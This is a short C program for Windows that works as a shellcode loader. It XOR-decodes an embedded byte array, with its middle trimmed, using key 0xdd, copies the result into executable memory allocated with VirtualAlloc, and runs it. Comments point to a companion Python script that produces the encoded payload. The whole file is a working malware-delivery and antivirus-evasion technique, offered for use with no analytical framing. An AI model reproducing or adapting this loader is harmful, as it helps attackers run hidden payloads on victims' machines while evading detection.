#include <stdio.h>
#include <windows.h>
#include <string.h>

int main(void)
{
    // Replace these placeholders with actual values
   // Total length of the shellcode - from the python script
    #define SC_LENGTH 782 
    char shellcode[SC_LENGTH] = { 0x21,0x95,0x5e,0x39,0x2d,
		---trimmed---
	0x1f,0x08,0xfc,0x55,0x7f };

        int xorkey = 0xdd;  // Replace with XOR key from the python script

    // XOR each byte of the shellcode with the key to decode it
    for (int idx = 0; idx < SC_LENGTH; idx++) {
        shellcode[idx] = shellcode[idx] ^ xorkey;
    }

    // Executing shellcode in memory
    void* exec_mem = VirtualAlloc(0, SC_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("VirtualAlloc failed. Error: %lu\n", GetLastError());
        return 1;
    }

    memcpy(exec_mem, shellcode, SC_LENGTH);

    void (*execute_shellcode)() = (void (*)())exec_mem;
    execute_shellcode();

    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
